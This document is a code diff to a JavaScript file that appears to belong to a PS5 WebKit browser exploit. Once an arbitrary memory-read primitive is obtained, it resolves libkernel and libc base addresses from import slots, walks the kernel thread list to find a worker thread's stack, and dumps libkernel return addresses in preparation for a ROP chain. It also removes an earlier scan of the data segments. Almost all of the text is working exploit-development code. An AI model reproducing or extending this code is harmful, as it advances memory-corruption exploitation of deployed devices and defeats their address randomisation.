@@ -181,123 +181,89 @@ function loadOffsets() {
     });
 }
 
-// With the read primitive live, work out how libSceNKWebKit is really mapped.
-// NOTE: the text segment is PF_X only (execute-only) -- reading wkBase+0 faults
-// and kills the WebProcess. Only the RW data segment (va 0x3bfc000..0x3e17018)
-// may be read.
-function dumpModuleSlots(core, carrier) {
+// With the read primitive live: resolve the module bases from the MEASURED
+// import slots, read the flag that selects which cond_wait_common runs, then
+// walk _thread_list exactly like main.js's find_worker() and dump every
+// libkernel pointer sitting on the worker's top stack page. One of those IS
+// OFFSET_lk_worker_wait_return.
+// NOTE: text is execute-only; only heap/stack/RW-data may be read.
+async function dumpModuleSlots(core, carrier) {
     const HC = 0x00010AE8;
+    const GUARD_SLOT = 0x03E18910, MEMSET_SLOT = 0x03E1AEE0;
+    const LK_GUARD = 0x0006D1D0, LC_MEMSET = 0x00014E70;
+    const THREAD_LIST = 0x64218, SELECTOR = 0x64014;
     const ctor = globalThis.__ps5NativeCtor;
     if (typeof ctor !== "number") { modsEl.textContent = "no __ps5NativeCtor"; return; }
     const base = ctor - HC;
 
-    function rd(addr, off) {
-        carrier.aim(addr);
-        const v = carrier.view;
-        let q = 0;
-        for (let k = off + 7; k >= off; k--) q = q * 256 + v[k];
-        carrier.restore();
-        return q;
+    function qw(v, i) { let x = 0; for (let k = i + 7; k >= i; k--) x = x * 256 + v[k]; return x; }
+    function rd(addr) { carrier.aim(addr); const x = qw(carrier.view, 0); carrier.restore(); return x; }
+    function rd32(addr) {
+        carrier.aim(addr); const v = carrier.view;
+        const x = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
+        carrier.restore(); return x;
     }
-    function hex(q) { return "0x" + q.toString(16); }
+    function hx(q) { return "0x" + q.toString(16); }
 
-    let out = "ctor   = " + hex(ctor) + "\nwkBase = " + hex(base)
-            + "  (aligned=" + (base % 0x4000 === 0) + ")\n\n";
+    const lk = rd(base + GUARD_SLOT) - LK_GUARD;
+    const lc = rd(base + MEMSET_SLOT) - LC_MEMSET;
+    let out = "wkBase = " + hx(base) + "  aligned=" + (base % 0x4000 === 0) + "\n"
+            + "lk     = " + hx(lk) + "  aligned=" + (lk % 0x4000 === 0) + "\n"
+            + "lc     = " + hx(lc) + "  aligned=" + (lc % 0x4000 === 0) + "\n\n";
 
-    // A textarea's C++ vptr points at its vtable, which lives in the RW data
-    // segment. If segments are mapped at their file VA deltas from one base,
-    // vptr-wkBase must land in 0x3bfc000..0x3e17018. If it does not, the data
-    // segment has its own base and every `wkBase + dataRVA` in the profile is
-    // meaningless.
+    const sel = rd32(lk + SELECTOR);
+    out += "lk+0x64014 (cond_wait selector) = " + sel + "\n"
+         + "  pthread_cond_wait therefore calls "
+         + (sel === 1 ? "0x38840 (the body I used)" : "0x38BE0 (the OTHER body)")
+         + "\n\n";
+
+    let worker = null;
     try {
-        const wrapper = carrier.textareaAddress;
-        const impl = rd(wrapper, 0x18);
-        const vptr = rd(impl, 0x00);
-        out += "textarea wrapper = " + hex(wrapper) + "\n"
-             + "  +0x18 impl      = " + hex(impl) + "\n"
-             + "  [impl] vptr     = " + hex(vptr) + "\n"
-             + "  vptr - wkBase   = " + hex(vptr - base) + "\n"
-             + "  in RW data seg (0x3bfc000..0x3e17018)? "
-             + ((vptr - base) >= 0x3bfc000 && (vptr - base) < 0x3e17018) + "\n\n";
-    } catch (e) {
-        out += "vptr probe threw: " + (e && e.message) + "\n\n";
-    }
-
-    function window(label, addr, n) {
-        let rows = label + "\n";
-        try {
-            carrier.aim(addr);
+        worker = new Worker("slopkit/rop_slave.js");
+        await new Promise(function (res) {
+            worker.onmessage = function () { res(1); };
+            worker.postMessage(0);
+        });
+        let t = rd(lk + THREAD_LIST), stack = 0, n = 0;
+        while (t && n++ < 64) {
+            carrier.aim(t);
             const v = carrier.view;
-            for (let i = 0; i < n; i += 8) {
-                let q = 0;
-                for (let k = i + 7; k >= i; k--) q = q * 256 + v[k];
-                let note = "";
-                if (q > base && q < base + 0x4500000) note = "   wk+0x" + (q - base).toString(16);
-                rows += "  +0x" + i.toString(16).padStart(3, "0") + "  " + hex(q) + note + "\n";
-            }
+            const nxt = qw(v, 0x38), sa = qw(v, 0xA8), sz = qw(v, 0xB0);
             carrier.restore();
-        } catch (e) { rows += "  threw: " + (e && e.message) + "\n"; }
-        return rows + "\n";
-    }
-    out += window("wk+0x03E14900  (relocation says __stack_chk_guard at +0x10)", base + 0x03E14900, 0x40);
-    out += window("wk+0x03E16EC0  (relocation says memset at +0x20)", base + 0x03E16EC0, 0x40);
-
-    // Those offsets came out of the relocation tables but hold WebKit-internal
-    // code pointers, so they are not the import GOT. Find the real slots the
-    // other way round: sweep the RW data segments for pointers that leave this
-    // module, and test each against the symbol offsets we already know. A slot
-    // holding libkernel's __stack_chk_guard must satisfy
-    // (value - 0x6D1D0) % 0x4000 == 0, and likewise memset for libc.
-    out += scanForImports(carrier, base);
-
-    function scanForImports(carrier, base) {
-        const RANGES = [[0x03BFC000, 0x03E17018], [0x03E18000, 0x03E272EC]];
-        const WK_SPAN = 0x4500000;
-        const LK_GUARD = 0x0006D1D0, LC_MEMSET = 0x00014E70;
-        let ext = 0, scanned = 0;
-        const lkHits = [], lcHits = [], sample = [];
-        for (const r of RANGES) {
-            for (let off = r[0]; off < r[1]; off += 0x100) {
-                let v;
-                try { carrier.aim(base + off); v = carrier.view; }
-                catch (e) { continue; }
-                for (let i = 0; i < 0x100 && off + i < r[1]; i += 8) {
-                    let q = 0;
-                    for (let k = i + 7; k >= i; k--) q = q * 256 + v[k];
-                    scanned++;
-                    if (q < 0x100000000 || q > 0xffffffffffff) continue;
-                    if (q >= base && q < base + WK_SPAN) continue;
-                    ext++;
-                    if ((q - LK_GUARD) % 0x4000 === 0 && lkHits.length < 12)
-                        lkHits.push([off + i, q]);
-                    if ((q - LC_MEMSET) % 0x4000 === 0 && lcHits.length < 12)
-                        lcHits.push([off + i, q]);
-                    if (sample.length < 14) sample.push([off + i, q]);
+            if (sz === 0x80000) { stack = sa; break; }
+            t = nxt;
+        }
+        out += "worker stack = " + hx(stack) + "  (walked " + n + " threads)\n\n";
+        if (stack) {
+            const seen = {};
+            const rows = [];
+            for (let off = 0x7F000; off < 0x80000; off += 0x100) {
+                carrier.aim(stack + off);
+                const v = carrier.view;
+                for (let i = 0; i < 0x100; i += 8) {
+                    const x = qw(v, i);
+                    if (x >= lk && x < lk + 0x80000) {
+                        const rva = x - lk;
+                        seen[rva] = (seen[rva] || 0) + 1;
+                        if (rows.length < 40)
+                            rows.push("  stack+0x" + (off + i).toString(16)
+                                      + "   lk+0x" + rva.toString(16));
+                    }
                 }
                 carrier.restore();
             }
+            out += "libkernel pointers on the worker top page:\n" + rows.join("\n") + "\n\n";
+            out += "unique RVAs (count):\n";
+            const keys = Object.keys(seen).map(Number).sort(function (x, y) { return x - y; });
+            for (const k of keys) out += "  lk+0x" + k.toString(16) + "   x" + seen[k] + "\n";
         }
-        let t = "IMPORT SCAN of the RW data segments\n"
-              + "  qwords scanned      : " + scanned + "\n"
-              + "  pointers outside wk : " + ext + "\n\n";
-        t += "  first external pointers seen:\n";
-        for (const h of sample)
-            t += "    wk+0x" + h[0].toString(16) + "  ->  0x" + h[1].toString(16) + "\n";
-        t += "\n  slots where (value - 0x6D1D0) is 0x4000-aligned  [libkernel_web]:\n";
-        for (const h of lkHits)
-            t += "    wk+0x" + h[0].toString(16) + "  value=0x" + h[1].toString(16)
-               + "  base=0x" + (h[1] - LK_GUARD).toString(16) + "\n";
-        if (!lkHits.length) t += "    (none)\n";
-        t += "\n  slots where (value - 0x14E70) is 0x4000-aligned  [libSceLibcInternal]:\n";
-        for (const h of lcHits)
-            t += "    wk+0x" + h[0].toString(16) + "  value=0x" + h[1].toString(16)
-               + "  base=0x" + (h[1] - LC_MEMSET).toString(16) + "\n";
-        if (!lcHits.length) t += "    (none)\n";
-        return t + "\n";
+    } catch (e) {
+        out += "worker probe threw: " + (e && e.message) + "\n";
     }
+    try { if (worker) worker.terminate(); } catch (e) { }
 
     modsEl.textContent = out;
-    mark("MODPROBE-DONE", "wkBase=" + hex(base));
+    mark("MODPROBE-DONE", "lk=" + hx(lk) + " lc=" + hx(lc) + " sel=" + sel);
 }
 
 async function run(slots) {
@@ -342,7 +308,7 @@ async function run(slots) {
             onEvent: function (tag, detail) { mark(tag, String(detail || "")); }
         });
         mark("PRIMITIVE-OK", "");
-        try { dumpModuleSlots(core, carrier); } catch (e) {
+        try { await dumpModuleSlots(core, carrier); } catch (e) {
             mark("MODPROBE-THREW", String(e && e.message));
         }
     } catch (e) {
